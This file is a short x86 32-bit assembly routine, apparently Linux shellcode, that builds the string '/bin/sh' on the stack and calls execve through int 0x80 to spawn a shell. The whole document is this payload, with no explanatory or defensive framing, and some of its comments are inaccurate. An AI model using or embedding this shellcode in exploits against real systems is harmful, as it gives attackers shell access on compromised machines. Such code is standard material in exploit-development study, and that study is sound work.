BITS 32

push    ebp
mov     ebp, esp
xor     eax, eax
push    0x6e68732f       ; ascii "nhs/"
push    0x6e69622f       ; ascii "nib/"
mov     [ebp-1],al
mov     al,  11          ; add 11 to the al
xor     ecx, ecx         ; clear ecx
mov     cl,  1           ; ecx = 1
mov     ebx, esp     ; ebx = esp + 1 (points to "/bin/sh")
xor     ecx, ecx         ; ecx = 0
xor     edx, edx         ; edx = 0
int     0x80
add     esp, 8          ; balance stack
pop     ebp
ret

